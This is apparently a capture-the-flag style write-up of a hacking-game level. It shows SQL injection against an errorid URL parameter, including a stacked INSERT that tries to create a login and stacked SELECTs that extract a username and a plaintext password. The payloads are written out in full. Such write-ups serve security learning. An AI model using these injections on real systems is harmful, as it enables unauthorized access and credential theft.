#### Level 08 - Extraterrestrial contact

Assuming this is yet another sql injecton challenge I tried: `http://www.hacmegame.org/hacmegame/challenges/ChallengeS25.html?errorid=;`

Then I got this error message:
```
java.sql.SQLException: Unexpected token: ; in statement [SELECT text FROM error WHERE id = ;]
```

Now I know what the query looks like.

Trying to get the query to look like this so I can log in with asdf:asdf

```sql
SELECT text FROM error WHERE id = 0;INSERT INTO user (username,password) VALUES ('asdf','asdf')
```

with the url: `?errorid=0;INSERT%20INTO%20user%20(username,password)%20values%20('asdf','asdf')`

But I get: "A unknown error occurred" :/

New tactic:

```
?errorid=0;SELECT username as text FROM user
```

Oh, it printed out "josef" :)

And of course we need the password too:

```
?errorid=0;SELECT password as text FROM user
```

Which printed out: OQ2UeotG

Success!